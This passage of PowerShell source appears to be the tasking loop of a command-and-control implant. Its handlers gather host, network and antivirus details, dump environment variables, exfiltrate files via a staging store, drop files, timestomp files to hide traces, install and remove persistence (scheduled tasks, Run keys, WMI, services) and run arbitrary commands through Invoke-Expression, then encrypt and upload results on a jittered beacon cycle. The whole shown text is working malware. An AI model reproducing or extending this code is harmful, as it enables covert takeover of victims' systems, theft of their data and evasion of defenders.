                if (-not $bsSaved) { $_output = "ERROR: blob save failed on all paths"; $_status = "error" }
                Remove-Variable bsPlain, bsProt, bsCode, bsDid, bsPathB64, bsCodeB64 -Force -ErrorAction SilentlyContinue
            }
        }

        "sysinfo" {
            Write-Log "[SYSINFO]: Gathering system info..."
            try {
                $info = @()
                $info += "=== SYSTEM INFO ==="
                $cs = Get-CimInstance Win32_ComputerSystem -ErrorAction SilentlyContinue
                $os = Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue
                $info += "Hostname:     $($env:COMPUTERNAME)"
                $info += "Domain:       $($cs.Domain)"
                $info += "OS:           $($os.Caption) $($os.Version) ($($os.OSArchitecture))"
                $info += "Build:        $($os.BuildNumber)"
                $info += "Install Date: $($os.InstallDate)"
                $info += "Boot Time:    $($os.LastBootUpTime)"
                $info += "User:         $($env:USERDOMAIN)\$($env:USERNAME)"
                $info += "Admin:        $([bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).Groups -match 'S-1-5-32-544'))"
                $info += "PID:          $PID"
                $info += "PPID:         $((Get-Process -Id $PID).Parent.Id)"
                $info += "Process:      $((Get-Process -Id $PID).ProcessName)"
                $info += "Path:         $((Get-Process -Id $PID).Path)"
                $info += "CWD:          $(Get-Location)"
                $info += ""
                $info += "=== NETWORK ==="
                $adapters = Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue | Where-Object { $_.IPAddress -ne '127.0.0.1' }
                foreach ($a in $adapters) { $info += "  $($a.InterfaceAlias): $($a.IPAddress)/$($a.PrefixLength)" }
                $info += ""
                $info += "=== HARDWARE ==="
                $info += "CPU:          $($cs.NumberOfProcessors) socket(s), $($cs.NumberOfLogicalProcessors) logical cores"
                $info += "RAM:          $([math]::Round($cs.TotalPhysicalMemory / 1GB, 1)) GB"
                $info += ""
                $info += "=== AV/EDR ==="
                $av = Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct -ErrorAction SilentlyContinue
                if ($av) { foreach ($p in $av) { $info += "  $($p.displayName)" } } else { $info += "  (none detected)" }
                $info += ""
                $info += "=== FIREWALL ==="
                try {
                    $fw = Get-NetFirewallProfile -ErrorAction SilentlyContinue | Where-Object { $_.Enabled -eq $true }
                    if ($fw) { foreach ($f in $fw) { $info += "  $($f.Name): Enabled" } } else { $info += "  All profiles disabled" }
                } catch { $info += "  (error reading firewall)" }
                $info += ""
                $info += "=== CONTAINER ==="
                $ctFound = $false
                if (Get-Command docker -ErrorAction SilentlyContinue) { $info += "  Docker available"; $ctFound = $true }
                if (Get-Command podman -ErrorAction SilentlyContinue) { $info += "  Podman available"; $ctFound = $true }
                if (-not $ctFound) { $info += "  None" }
                $info += ""
                $info += "=== NET TOOLS ==="
                $netTools = @("netstat","nmap","curl","wget","nc","tcpdump","Invoke-WebRequest")
                $found = @()
                foreach ($t in $netTools) { if (Get-Command $t -ErrorAction SilentlyContinue) { $found += $t } }
                if ($found.Count -gt 0) { $info += "  $($found -join ', ')" } else { $info += "  None" }
                $_output = $info -join "`n"
            } catch {
                $_output = "ERROR: $($_.Exception.Message)"; $_status = "error"
            }
        }

        "env" {
            Write-Log "[ENV]: Gathering environment variables..."
            try {
                $_output = [System.Environment]::GetEnvironmentVariables() | `
                    ForEach-Object { $_.GetEnumerator() } | `
                    Sort-Object -Property Name | `
                    ForEach-Object { "$($_.Name)=$($_.Value)" } | `
                    Join-String -Separator "`n"
            } catch {
                $_output = "ERROR: $($_.Exception.Message)"; $_status = "error"
            }
        }

        "download" {
            $filePath = $_taskArgs.target_path
            if (-not [IO.Path]::IsPathRooted($filePath)) { $filePath = Join-Path $PWD $filePath }
            Write-Log "[DOWNLOAD]: Reading file: $filePath"
            if (-not (Test-Path $filePath)) {
                $_output = "ERROR: File not found: $filePath"; $_status = "error"
            } else {
                try {
                    $fileBytes   = [IO.File]::ReadAllBytes($filePath)
                    $fileName    = [IO.Path]::GetFileName($filePath)
                    $stagingDest = "$STAGING_BASE/dl_$fileName"
                    $result      = Invoke-TransportUploadBinary -Path $stagingDest -Data $fileBytes
                    if ($null -ne $result) {
                        $_stagingPath = $stagingDest
                        $_output      = "staged $fileName ($($fileBytes.Length) bytes)"
                        Write-Log "[DOWNLOAD]: [OK] staged at $stagingDest"
                    } else {
                        $_output = "ERROR: Failed to stage file"; $_status = "error"
                    }
                } catch {
                    $_output = "ERROR: $($_.Exception.Message)"; $_status = "error"
                }
            }
        }

        "upload" {
            $stagingPath = $_taskArgs.staging_path
            $fileName    = $_taskArgs.filename
            $destPath    = $_taskArgs.dest_path
            Write-Log "[UPLOAD]: Writing $fileName to disk..."
            try {
                $fileBytes = Invoke-TransportDownloadBinary -Path $stagingPath
                if ($null -ne $fileBytes -and $fileBytes.Length -gt 0) {
                    if ($destPath) {
                        if (-not [IO.Path]::IsPathRooted($destPath)) { $destPath = Join-Path $PWD $destPath }
                        if (Test-Path $destPath -PathType Container -ErrorAction SilentlyContinue) { $destPath = Join-Path $destPath $fileName }
                        $parentDir = [IO.Path]::GetDirectoryName($destPath)
                        if ($parentDir -and -not (Test-Path $parentDir)) { New-Item -ItemType Directory -Path $parentDir -Force | Out-Null }
                        $savePath = $destPath
                    } else {
                        $savePath = Join-Path (Get-Location) $fileName
                    }
                    [IO.File]::WriteAllBytes($savePath, $fileBytes)
                    $_output = "OK: Saved $fileName ($($fileBytes.Length) bytes) to $savePath"
                    Write-Log "[UPLOAD]: [OK] $_output"
                } else {
                    $_output = "ERROR: Staging file returned empty"; $_status = "error"
                }
            } catch {
                $_output = "ERROR: $($_.Exception.Message)"; $_status = "error"
            }
        }

        "sleep" {
            $newSleep = [int]($_taskArgs.seconds)
            if ($newSleep -ge 1) {
                $oldSleep   = $BASE_SLEEP
                $BASE_SLEEP = $newSleep
                $JITTER     = [math]::Floor($BASE_SLEEP * $JITTER_PERCENT / 100)
                $_output = "OK: Sleep changed from ${oldSleep}s to ${BASE_SLEEP}s (jitter: ${JITTER_PERCENT}%)"
                Write-Log "[CONFIG]: $_output"
            } else {
                $_output = "ERROR: Invalid sleep value (must be >= 1)"; $_status = "error"
            }
        }

        "jitter" {
            $newJitter = [int]($_taskArgs.percent)
            if ($newJitter -ge 0 -and $newJitter -le 50) {
                $oldJitter      = $JITTER_PERCENT
                $JITTER_PERCENT = $newJitter
                $JITTER         = [math]::Floor($BASE_SLEEP * $JITTER_PERCENT / 100)
                $_output = "OK: Jitter changed from ${oldJitter}% to ${JITTER_PERCENT}% (sleep: ${BASE_SLEEP}s)"
                Write-Log "[CONFIG]: $_output"
            } else {
                $_output = "ERROR: Invalid jitter value (must be 0-50)"; $_status = "error"
            }
        }

        "timestomp" {
            $targetFile = $_taskArgs.target
            $refFile    = $_taskArgs.reference
            Write-Log "[TIMESTOMP]: Target=$targetFile Ref=$refFile"
            try {
                if (-not (Test-Path $targetFile)) {
                    $_output = "ERROR: Target file not found: $targetFile"; $_status = "error"
                } elseif (-not (Test-Path $refFile)) {
                    $_output = "ERROR: Reference file not found: $refFile"; $_status = "error"
                } else {
                    $ref = Get-Item $refFile -Force
                    $tgt = Get-Item $targetFile -Force
                    $tgt.CreationTime   = $ref.CreationTime
                    $tgt.LastWriteTime  = $ref.LastWriteTime
                    $tgt.LastAccessTime = $ref.LastAccessTime
                    $_output = "OK: Timestamps copied from $refFile to $targetFile (Created: $($ref.CreationTime), Modified: $($ref.LastWriteTime), Accessed: $($ref.LastAccessTime))"
                    Write-Log "[TIMESTOMP]: [OK] $_output"
                }
            } catch { $_output = "ERROR: $($_.Exception.Message)"; $_status = "error" }
        }

        "timestomp_set" {
            $targetFile  = $_taskArgs.target
            $dateTimeStr = $_taskArgs.timestamp
            Write-Log "[TIMESTOMP_SET]: Target=$targetFile DateTime=$dateTimeStr"
            try {
                if (-not (Test-Path $targetFile)) {
                    $_output = "ERROR: Target file not found: $targetFile"; $_status = "error"
                } else {
                    $newTime = [DateTime]::Parse($dateTimeStr)
                    $tgt = Get-Item $targetFile -Force
                    $tgt.CreationTime   = $newTime
                    $tgt.LastWriteTime  = $newTime
                    $tgt.LastAccessTime = $newTime
                    $_output = "OK: Timestamps set on $targetFile to $($newTime.ToString('yyyy-MM-dd HH:mm:ss'))"
                    Write-Log "[TIMESTOMP_SET]: [OK] $_output"
                }
            } catch { $_output = "ERROR: $($_.Exception.Message)"; $_status = "error" }
        }

        "persist_probe" {
            $ptech = $_taskArgs.technique
            if ([string]::IsNullOrEmpty($ptech)) {
                Write-Log "[PERSIST_PROBE]: Probing all techniques..."
                $_output = Invoke-PersistProbeAll
            } else {
                Write-Log "[PERSIST_PROBE]: Probing selected: $ptech"
                $psel = @()
                foreach ($pt in ($ptech -split ',')) {
                    $pline = switch ($pt.Trim()) {
                        'schtask-logon'     { Invoke-PersistProbe-SchtaskLogon }
                        'registry-run'      { Invoke-PersistProbe-RegistryRun }
                        'startup-folder'    { Invoke-PersistProbe-StartupFolder }
                        'schtask-boot'      { Invoke-PersistProbe-SchtaskBoot }
                        'registry-run-hklm' { Invoke-PersistProbe-RegistryRunHklm }
                        'wmi-event'         { Invoke-PersistProbe-WmiEvent }
                        'service'           { Invoke-PersistProbe-Service }
                        default             { $null }
                    }
                    if ($pline) { $psel += $pline }
                }
                $_output = "PERSIST_PROBE_RESULT`n" + ($psel -join "`n")
            }
        }

        "persist_install" {
            $_pid = $_taskArgs.technique
            Write-Log "[PERSIST_INSTALL]: technique=$_pid"
            $_rawOut = switch ($_pid) {
                'schtask-logon'     { Invoke-PersistInstall-SchtaskLogon }
                'registry-run'      { Invoke-PersistInstall-RegistryRun }
                'startup-folder'    { Invoke-PersistInstall-StartupFolder }
                'schtask-boot'      { Invoke-PersistInstall-SchtaskBoot }
                'registry-run-hklm' { Invoke-PersistInstall-RegistryRunHklm }
                'wmi-event'         { Invoke-PersistInstall-WmiEvent }
                'service'           { Invoke-PersistInstall-Service }
                default             { "ERROR: Unknown persistence technique '$_pid'" }
            }
            # Extract ARTIFACT: lines from raw output into structured artifacts array
            $_lines = $_rawOut -split "`n"
            $_cleanLines = @()
            foreach ($_line in $_lines) {
                if ($_line -match '^ARTIFACT:([^:]+):(.+)$') {
                    $_artifacts += @{ op = "add"; type = $Matches[1]; path = $Matches[2] }
                } else {
                    $_cleanLines += $_line
                }
            }
            $_output = ($_cleanLines -join "`n").TrimEnd()
            if ($_output -match '^ERROR:') { $_status = "error" }
        }

        "persist_remove" {
            $_pid = $_taskArgs.technique
            Write-Log "[PERSIST_REMOVE]: technique=$_pid"
            $_rawOut = switch ($_pid) {
                'schtask-logon'     { Invoke-PersistRemove-SchtaskLogon }
                'registry-run'      { Invoke-PersistRemove-RegistryRun }
                'startup-folder'    { Invoke-PersistRemove-StartupFolder }
                'schtask-boot'      { Invoke-PersistRemove-SchtaskBoot }
                'registry-run-hklm' { Invoke-PersistRemove-RegistryRunHklm }
                'wmi-event'         { Invoke-PersistRemove-WmiEvent }
                'service'           { Invoke-PersistRemove-Service }
                default             { "ERROR: Unknown persistence technique '$_pid'" }
            }
            # Extract ARTIFACT_REMOVED: lines into structured artifacts array
            $_lines = $_rawOut -split "`n"
            $_cleanLines = @()
            foreach ($_line in $_lines) {
                if ($_line -match '^ARTIFACT_REMOVED:([^:]+):(.+)$') {
                    $_artifacts += @{ op = "remove"; type = $Matches[1]; path = $Matches[2] }
                } else {
                    $_cleanLines += $_line
                }
            }
            $_output = ($_cleanLines -join "`n").TrimEnd()
            if ($_output -match '^ERROR:') { $_status = "error" }
        }

        "persist_status" {
            $_pid = $_taskArgs.technique
            Write-Log "[PERSIST_STATUS]: technique=$_pid"
            $_output = switch ($_pid) {
                'schtask-logon'     { Invoke-PersistStatus-SchtaskLogon }
                'registry-run'      { Invoke-PersistStatus-RegistryRun }
                'startup-folder'    { Invoke-PersistStatus-StartupFolder }
                'schtask-boot'      { Invoke-PersistStatus-SchtaskBoot }
                'registry-run-hklm' { Invoke-PersistStatus-RegistryRunHklm }
                'wmi-event'         { Invoke-PersistStatus-WmiEvent }
                'service'           { Invoke-PersistStatus-Service }
                default             { "ERROR: Unknown persistence technique '$_pid'" }
            }
            if ($_output -match '^ERROR:') { $_status = "error" }
        }

        "persist_action" {
            # PS-only shorthand → schtask-logon default technique
            $persistAction = $_taskArgs.action
            Write-Log "[PERSIST]: Shorthand dispatch → schtask-logon (action=$persistAction)"
            try {
                $_output = switch ($persistAction) {
                    { $_ -in 'install','install-and-cleanup' } {
                        $r = Invoke-PersistInstall-SchtaskLogon
                        if ($persistAction -eq 'install-and-cleanup' -and $env:_STUB_PATH -and (Test-Path $env:_STUB_PATH -ErrorAction SilentlyContinue)) {
                            try { Remove-Item -Path $env:_STUB_PATH -Force -ErrorAction Stop; $r += "`n  Original deleted: $($env:_STUB_PATH)" }
                            catch { $r += "`n  WARN: Could not delete original: $($env:_STUB_PATH)" }
                        }
                        $r
                    }
                    'remove' { Invoke-PersistRemove-SchtaskLogon }
                    'check'  { Invoke-PersistStatus-SchtaskLogon }
                    default  { "ERROR: Unknown persist action '$persistAction'" }
                }
            } catch { $_output = "ERROR: $($_.Exception.Message)"; $_status = "error" }
            if ($_output -match '^ERROR:') { $_status = "error" }
        }

        "shell" {
            # Apply requested CWD if provided
            $reqCwd = $_taskArgs.cwd
            if (-not [string]::IsNullOrEmpty($reqCwd)) {
                try {
                    Set-Location $reqCwd -ErrorAction Stop
                } catch {
                    $_output = "[WARN: Set-Location '$reqCwd' failed ($($_.Exception.Message)) — running from $((Get-Location).Path)]`n"
                }
            }
            Write-Log "[EXEC]: Executing command..."
            try {
                $_output += Invoke-Expression $_taskArgs.cmd 2>&1 | Out-String
                if ($LASTEXITCODE -ne 0 -or $_output -match 'ERROR:') { $_status = "error" }
            } catch {
                $_output += "ERROR: $($_.Exception.Message)"; $_status = "error"
            }
            # Capture CWD after execution (PS provider API, not .NET CWD)
            $_newCwd = (Get-Location).Path
            Write-Log "[EXEC]: Output ($($_output.Length) bytes), CWD=$_newCwd"
        }

        default {
            $_output = "ERROR: unknown task type '$_taskType'"; $_status = "error"
            Write-Log "[INPUT]: [X] $_output"
        }

    } # end switch

    # === BUILD JSON RESPONSE ENVELOPE ===
    $responseObj = [ordered]@{
        id            = $_cmdId
        type          = $_taskType
        status        = $_status
        output        = if ($_output) { $_output } else { "" }
        cwd           = if ($_newCwd) { $_newCwd } else { "" }
        staging_path  = if ($_stagingPath) { $_stagingPath } else { "" }
        artifacts     = @($_artifacts)
        session_token = if ($_taskToken) { $_taskToken } else { "" }
    }
    $responseJson = $responseObj | ConvertTo-Json -Compress -Depth 5
    # Fix PS5 HTML-escaping of <, >, &
    $responseJson = $responseJson -replace '\\u003e','>' -replace '\\u003c','<' -replace '\\u0026','&'

    Remove-Variable -Name _cmdId, _taskType, _taskArgs, _task, _taskToken, _status, _output, _newCwd, _stagingPath, _artifacts -Force 2>$null

    # === OUTPUT ENCRYPTION — RSA-OAEP-SHA256 + AES-256-GCM (agent→server) ===
    Write-Log ""
    Write-Log "[OUTPUT]: Encrypting output (OAEP+GCM)..."

    $encryptedResult = Invoke-NativeEncrypt -PlainBytes ([System.Text.Encoding]::UTF8.GetBytes($responseJson)) -RSA $RSA
    if (-not $encryptedResult) {
        # Fallback: python3
        $outPyCode = 'import sys,os,base64;from cryptography.hazmat.primitives.asymmetric import padding as _p;from cryptography.hazmat.primitives import hashes as _h;from cryptography.hazmat.primitives.serialization import load_pem_public_key;from cryptography.hazmat.primitives.ciphers.aead import AESGCM;_oaep=_p.OAEP(mgf=_p.MGF1(_h.SHA256()),algorithm=_h.SHA256(),label=None);lines=sys.stdin.read().split(chr(0),1);pub=load_pem_public_key(lines[0].encode());data=lines[1].encode() if len(lines)>1 else b"";k=os.urandom(32);n=os.urandom(12);blob=n+AESGCM(k).encrypt(n,data,None);wrapped=pub.encrypt(k,_oaep);print(base64.b64encode(wrapped).decode()+":"+base64.b64encode(blob).decode(),end="")'
        $encryptedResult = Invoke-PythonCrypto -Code $outPyCode -Stdin ($PUBLIC_KEY_PEM + [char]0 + $responseJson)
        Remove-Variable -Name outPyCode -Force 2>$null
    }
    Remove-Variable -Name responseJson -Force 2>$null

    if ($encryptedResult) {
        Write-Log "[OUTPUT]: [OK] Output encrypted ($($encryptedResult.Length) bytes)"
    } else {
        Write-Log "[OUTPUT]: [X] Encryption failed"
        $encryptedResult = "MZ"
    }

    # === UPLOAD ENCRYPTED OUTPUT ===
    Write-Log "[OUTPUT]: Uploading encrypted output..."
    Invoke-TransportUpload -Path "$FOLDER_PATH$OUTPUT_FILE" -Content $encryptedResult | Out-Null
    Write-Log "[OUTPUT]: [OK] File updated"

    Remove-Variable -Name encryptedResult -Force

    # === CLEAN INPUT FILE ===
    Write-Log "[INPUT]: Cleaning input file..."
    Invoke-TransportUpload -Path "$FOLDER_PATH$INPUT_FILE" -Content "MZ" | Out-Null
    Write-Log "[INPUT]: [OK] File cleaned (MZ)"

    # === SLEEP WITH JITTER (recalculate here so SLEEP/JITTER commands take effect immediately) ===
    if ($JITTER -gt 0) {
        $rndBytes = [byte[]]::new(2)
        [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($rndBytes)
        $rndVal = [System.BitConverter]::ToUInt16($rndBytes, 0)
        $jitterValue = [int]($rndVal % ($JITTER * 2 + 1)) - $JITTER
    } else { $jitterValue = 0 }
    $sleepTime = [int]($BASE_SLEEP + $jitterValue)
    if ($sleepTime -lt 5) { $sleepTime = 5 }
    Write-Log ""
    Write-Log "[SLEEP]: Waiting ${sleepTime}s"
    Start-Sleep -Seconds $sleepTime
    Write-Log "=== CYCLE END ==="
}
